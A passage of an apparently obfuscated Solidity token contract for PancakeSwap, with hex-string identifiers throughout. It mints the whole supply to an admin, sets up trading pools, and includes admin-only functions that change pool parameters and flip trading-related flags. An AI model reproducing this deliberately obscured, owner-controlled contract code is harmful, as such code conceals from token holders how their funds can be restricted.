Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Ox5f57b9f1b16673b2c907d02b529bf0bc823bcf6bf911e1a44d2954e238ffe25ecccf4c29d097d46526b12e66bb0a30596755bde67972f2ae139bca3584297ce2.length;for(uint8 i;i < _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b.length; i++) {address Ox17aa8b6f39007082e165dbde7bba38c93f09635ff7232ddeb635294d447674c42003a91efbaf67695b893bcb487b006449b70762fabd8fd2e899952fcbd6ca89;if(i==0) Ox17aa8b6f39007082e165dbde7bba38c93f09635ff7232ddeb635294d447674c42003a91efbaf67695b893bcb487b006449b70762fabd8fd2e899952fcbd6ca89 = pair;else {Oxb023b4a4990e9601c5cd7c85127b46de61bbac711141fdffbc6485a973530a12a8c82d2a890262f4720a90fbe9ea7cbb9116a5f549e4cf8d52f98210bc69ac5c[_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f == Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91 ? address(this) : _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f] = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox8408bfd8615b20256b2209b1e0a32f520187c0db537e303def568990210918b49e7c5a550b78ee45b687f66fa53847a472025fe25a4df28ba739df8e046bfcfd;Oxb023b4a4990e9601c5cd7c85127b46de61bbac711141fdffbc6485a973530a12a8c82d2a890262f4720a90fbe9ea7cbb9116a5f549e4cf8d52f98210bc69ac5c[_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c == Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91 ? address(this) : _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c] = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox9e7d7956eab2d1f3d718fd7ba21002f364ed5bd77593e1ab1fa39c156d95796518b9b8ec73ad5864a6ae1c68081008b780294c8421db4db4a3de9c4f5ebebe0d;if(_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f == Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91) _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f = address(this);if(_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c == Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91) _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c = address(this);Ox17aa8b6f39007082e165dbde7bba38c93f09635ff7232ddeb635294d447674c42003a91efbaf67695b893bcb487b006449b70762fabd8fd2e899952fcbd6ca89 = IPancakeSwapFactory(Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.factory()).createPair(_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f,_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c);}pool storage Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99 = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox17aa8b6f39007082e165dbde7bba38c93f09635ff7232ddeb635294d447674c42003a91efbaf67695b893bcb487b006449b70762fabd8fd2e899952fcbd6ca89];Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.pairAddress = Ox17aa8b6f39007082e165dbde7bba38c93f09635ff7232ddeb635294d447674c42003a91efbaf67695b893bcb487b006449b70762fabd8fd2e899952fcbd6ca89;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxf40c8b8eb4c8f9ba62daf8fae92b1a85e1c1fc94b0c0e03f6c98efe8a5b4372fc46193c9469304848bb09508908ce295f0ea1ca254052654ab997335ded7c827 = IPancakeSwapPair(Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.pairAddress);if(_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b.length > 0) { Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0 = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxf53b536f8f63a121f71a8464f904c96d4e525bae023cd62463aa5813869ef7d6475fc7f26e87b92590343771cb728d766190079a63f7985a111c0b22dd355e42 = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Oxf53b536f8f63a121f71a8464f904c96d4e525bae023cd62463aa5813869ef7d6475fc7f26e87b92590343771cb728d766190079a63f7985a111c0b22dd355e42;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86 = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox8408bfd8615b20256b2209b1e0a32f520187c0db537e303def568990210918b49e7c5a550b78ee45b687f66fa53847a472025fe25a4df28ba739df8e046bfcfd = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox8408bfd8615b20256b2209b1e0a32f520187c0db537e303def568990210918b49e7c5a550b78ee45b687f66fa53847a472025fe25a4df28ba739df8e046bfcfd;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox9e7d7956eab2d1f3d718fd7ba21002f364ed5bd77593e1ab1fa39c156d95796518b9b8ec73ad5864a6ae1c68081008b780294c8421db4db4a3de9c4f5ebebe0d = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox9e7d7956eab2d1f3d718fd7ba21002f364ed5bd77593e1ab1fa39c156d95796518b9b8ec73ad5864a6ae1c68081008b780294c8421db4db4a3de9c4f5ebebe0d;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox25ac60a6ced7dd9cad804b6813939b022bd79181f9455c8ccb620725ed5528fc348781bb27c44ff3f41a236e7b969370830861c8d5926de958deded430edec84 = IPancakeSwapPair(_Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox25ac60a6ced7dd9cad804b6813939b022bd79181f9455c8ccb620725ed5528fc348781bb27c44ff3f41a236e7b969370830861c8d5926de958deded430edec84);Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Oxf149a105051114819da29531bb0902c5e1f84466db4ab02f408e33d2c027b1fc8c7b6c75a8391e932e838ad0287bc1e43e576054bff2074f7effa10f7a036df2 = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Oxf149a105051114819da29531bb0902c5e1f84466db4ab02f408e33d2c027b1fc8c7b6c75a8391e932e838ad0287bc1e43e576054bff2074f7effa10f7a036df2;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox3bca59f7beea7a50df18ecb068f7355bdb46b29de2ec324c907ac132570588955fba70c9bab890a3e5d48e936762b1449cc14a9fdab9938cd2a2a47ff6316ef5 = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox3bca59f7beea7a50df18ecb068f7355bdb46b29de2ec324c907ac132570588955fba70c9bab890a3e5d48e936762b1449cc14a9fdab9938cd2a2a47ff6316ef5;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f = i==0 ? Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.WETH() : _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c = i==0 ? address(this) : _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox5fa83ae41e2b6af4338e3d0f12161506a97bc98f73eef539c419e0e14b885457bbdb54da26392cf4c7e002892f032c1a15f850054e233563c54bfeacd83ab21a = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox5fa83ae41e2b6af4338e3d0f12161506a97bc98f73eef539c419e0e14b885457bbdb54da26392cf4c7e002892f032c1a15f850054e233563c54bfeacd83ab21a;Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.Ox0a5a11a5463979f02464c98b7ca5a23edf1d2389dc9620012874ee8d473bb6d8ddf02f8f384622762063dab1806da28df8e84d8e1f215a61c2a5254b37864774 = _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[i].Ox0a5a11a5463979f02464c98b7ca5a23edf1d2389dc9620012874ee8d473bb6d8ddf02f8f384622762063dab1806da28df8e84d8e1f215a61c2a5254b37864774;Ox2c8c0c56e8f34182bf27eb23aa6b29191c4b95233d35e2bc856e158a60c460355b6c48588b0615ad2ce7f82c921b7e771e7183bd0eff3cbffe3358382a862f35[Ox2b047b2a67cfa403acc6206dbe484ef113cf9f0d60a2261c14e986226fccf562ba36d41b7276e60dff1c1fc955dae249fe0f4f688e4c958e29dd52beedfa0b99.pairAddress];}poolList[i] = Ox17aa8b6f39007082e165dbde7bba38c93f09635ff7232ddeb635294d447674c42003a91efbaf67695b893bcb487b006449b70762fabd8fd2e899952fcbd6ca89;}}addAdmin(Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0);emit Transfer(address(0x0), Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0, Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd);}receive() external payable {}function Oxf6dd98786c4a71e90fc34e047544b51e6b6313f862dcc80c31fb8e8f116b1875bfa9714744cc1af5604e9fb9bd3b8c6a9fbfc32e4a6df96130a7bb7335ba37e5() external view returns (bool) {return !Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3;}function Ox6a2f59473a7d3c1db687946461febdbafe2e0d94a3b2c3890f138f5208b6e10148a2d49e11b501e18b7cbb0e80773870be19ddcb340bae84ad7677abb4397668(address Ox99375b9d3b5b04e18c7f48d5ed370934c38957db3a297019ee37fe26874fb8e839e7ea38a436f5d3369450565606d81009e3231857d497a3e76ed57f90ee656b) external view returns (bool) {return Oxf7980711b86977ba5e8d654647570bbd8c8d15c69b771871955c099a0adc23068683ae241fb17e5fe7fb7dd012faba896de9d52d469d66743a7d90b26aade0e7[Ox99375b9d3b5b04e18c7f48d5ed370934c38957db3a297019ee37fe26874fb8e839e7ea38a436f5d3369450565606d81009e3231857d497a3e76ed57f90ee656b];}function Oxfd44d42058fe0b5cf4c1755734c0ff201b3a0c2e2edf0e5a5037ecdf829aed1ca6ea012f369d4c62fb6c4d894502ae555a3093e50d64fb572219a3690ae04d63(uint256 _index) external view returns (uint256) {return Oxdf8e550541dad141f0832ce8fc0b522276aa867636a02d977198bba16e73ac28bb1cc118a2acaccd034cd8dc76531be10d9966f4dd34a0a22262286c0678342c[_index] / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;}function Ox529b59ba1961ed72e7888997de7c57aad5fa55613b7417a46e33ebfc15210637748ded3a8ce942825d9016da4c2d6825c6ed4ad58dbc85baf39ea5c049e4f98d(address Ox99375b9d3b5b04e18c7f48d5ed370934c38957db3a297019ee37fe26874fb8e839e7ea38a436f5d3369450565606d81009e3231857d497a3e76ed57f90ee656b) external view returns (pool memory) {return Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox99375b9d3b5b04e18c7f48d5ed370934c38957db3a297019ee37fe26874fb8e839e7ea38a436f5d3369450565606d81009e3231857d497a3e76ed57f90ee656b];}function totalSupply() external view override returns (uint256) {return Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd;}   function balanceOf(address who) external view override returns (uint256) {return Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[who] / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;}function Oxc5bab90642a6f1c73afe9ced493b2e6e9dce1ac90931af114e11627a6106ae5d51aa286adf6e9fec5dd37dd96a2f4756e35063e552fd2f28832a98883a854060(address addr) internal view returns (bool) {uint size;assembly { size := extcodesize(addr) }return size > 0;}function allowance(address owner_, address spender)external view override returns (uint256){return Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[owner_][spender];}function decreaseAllowance(address spender, uint256 subtractedValue)external returns (bool){uint256 oldValue = Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender];if (subtractedValue >= oldValue) {Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender] = 0;} else {Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender] = oldValue - subtractedValue;}emit Approval(msg.sender,spender,Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender]);return true;}function increaseAllowance(address spender, uint256 addedValue)external returns (bool){Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender] = Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender] + addedValue;emit Approval(msg.sender,spender,Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender]);return true;}function approve(address spender, uint256 value)external override returns (bool){Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[msg.sender][spender] = value;emit Approval(msg.sender, spender, value);return true;}function Ox2762c2f5d373e939a17da2b1fd8cc9e4b16eab601f842de2125087a21a387b2666c694ae5e373cb745186503ef1c2a73648a1f546a9b0baa2f38618000b4cbb4(address Ox9f3b4c51601238d6aeea0e30b12247fae88e46b830e3552c8a0dfc1fba37ae214798ae3bf35fd939de23d4745ecfd44464735894f60c704125eabae6aacd4619, uint256 Ox6593b7e6aad4472163cfc5c49aa764ca6957bf6757e3931c685dac8675f96fb6ccecb2790f3fa0787cababb6a1ae89bc1d97d030fc9c73df1ed2fc5afccac6c1, uint256 Ox6b41e88162d9a358ab1fdad41ece647c88628e5287f05eae8d5e83099e873fd7e7c0e2c7133b0f7a9db204cb3457ab8d2b7e5d7be8096738aa08df7f1bc71882) external onlyAI {Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9f3b4c51601238d6aeea0e30b12247fae88e46b830e3552c8a0dfc1fba37ae214798ae3bf35fd939de23d4745ecfd44464735894f60c704125eabae6aacd4619].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 = Ox6593b7e6aad4472163cfc5c49aa764ca6957bf6757e3931c685dac8675f96fb6ccecb2790f3fa0787cababb6a1ae89bc1d97d030fc9c73df1ed2fc5afccac6c1;Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9f3b4c51601238d6aeea0e30b12247fae88e46b830e3552c8a0dfc1fba37ae214798ae3bf35fd939de23d4745ecfd44464735894f60c704125eabae6aacd4619].Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe = Ox6b41e88162d9a358ab1fdad41ece647c88628e5287f05eae8d5e83099e873fd7e7c0e2c7133b0f7a9db204cb3457ab8d2b7e5d7be8096738aa08df7f1bc71882;}function Ox4f9f072565dc75d4a21920a4e9dc1d5795f27af7626fb4eaba88c5dd40fce3541cfe8e4a31078922d17371fc8725f32e0681fb9a06d65a54888896db4bbfd58e(address Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944, uint256 value) external onlyAI {Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox64f3e55a9b281caf6c9ca00c930040cd0e300114d8123d214e23797ef828ebd023c2b25ca03ee082e236b0c127f80593826f1877768b89bec140d27bc130a944].Ox5fa83ae41e2b6af4338e3d0f12161506a97bc98f73eef539c419e0e14b885457bbdb54da26392cf4c7e002892f032c1a15f850054e233563c54bfeacd83ab21a = value;}function Ox23d044b0ac728fbe308e21f655c45dd68dd54f804c191037cf944b6623934050c77df4c4f666a922e3de599dd6b70e4b814389dbc20e8c8bc3fc6ed7b83fdf0d(bool Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9) external onlyAI {Ox7165f36f5376e104d09295ed5ec2c5debc07e6795dd8de7f8d5a89876c58c4696e7bac6b6e4eaa8cc0707fa0ee2a84f1270c6be1b5177b6b1ff6b9df992db620 = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;Ox95b66eb5787f49baf7f65d3614d8eef6296335b3dff7e28a3981f70494cb5f1c52f298c61b4f33f01bf1592daaaf79345d930391307963633a3f36e29e8c401a = Oxb707dd54e103d4fa6756eaae8b3690f6f65ba753f2e81885817e6883d1549bfa0270c27344c2e2662ff694fb8c2d3bcc1442b8d90f1b68b7a4d391affa1f02f9;}function Oxc5ef964b6a73d9523fcc367f3a8dc0a9c21755aa3ed423938ecb5a6e327debb9d4bac86da7144a4ef2117476a64abf6c807f9abd965e6263957c3aabdad3c39f(uint256 _Ox193bc2e3d520d000f97cb7aa3756c9bd6ad69586f091a692108f7a3bbda8eec6905c32747a3f026e79f08fb3fb8f4448f0502a2cd88543aadcc1b533b25a257d, uint _Oxa82526388298eb946c1519386d2ea42e558cca8d35df99a615ad184e5eac4600fb4c4f60d4d88fda427eb3d0bdd16fd11a331bb01151fa75b9f2ed34844cf640, uint256 _Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d, uint8 _Oxba4d4f1cc732b8d3c8fdbcb5e7287a442ac31a97c823059fd4342396812412abc669e9953cfdd5ef58b27c3dd0602d10e64b8d097253c47091de07bfba934bc7, uint256 